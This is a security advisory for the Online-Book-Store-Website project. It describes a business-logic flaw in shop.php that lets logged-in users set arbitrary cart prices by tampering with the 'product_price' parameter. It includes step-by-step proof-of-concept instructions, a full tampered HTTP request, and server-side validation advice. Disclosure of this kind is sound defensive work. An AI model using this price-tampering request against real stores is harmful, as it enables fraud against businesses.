# keerti1924 / Online-Book-Store-Website - shop.php Business Logic Flaw

## Vendor Homepage:
[Online-Book-Store-Website](https://github.com/keerti1924/Online-Book-Store-Website)

## Impact
The shop.php script in keerti1924's Online-Book-Store-Website is vulnerable to a business logic flaw. By manipulating the 'product_price' parameter during the purchase process, authenticated users can change the price of items in their shopping cart to an arbitrary value, potentially leading to financial losses for the business.

## Proof of Concept
Step 1: Login as a normal user\
Step 2: Add a book to the cart and intercept the request.\
Step 3: Modify the value of the 'product_price' parameter to the desired price.\
Step 4: Observe that the item's price in the cart has been changed accordingly.\

## HTTP Request Example
```http request
POST /shop.php HTTP/2
Host: [REDACTED]
Cookie: PHPSESSID=[REDACTED]
Content-Length: 112
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="121", "Not A(Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i

product_quantity=1&product_name=The+Bookshop&product_price=1&product_image=book+shop.jpg&add_to_cart=Add+to+cart
```

### Proof with Screenshot
![Screenshot](https://github.com/skid-nochizplz/skid-nochizplz/blob/main/TrashBin/CVE/keerti1924%20Online-Book-Store-Website/Business%20Logic/Business%20Logic%20shop.php%20proof%20.png?raw=true)

## Remidiation
To mitigate this issue, ensure that all price-related calculations are performed and verified on the server-side. Implement proper access controls and validation mechanisms to prevent unauthorized modifications to prices or other critical parameters during the purchase process.

## CWE
[CWE-840: Business Logic Errors ](https://cwe.mitre.org/data/definitions/840.html)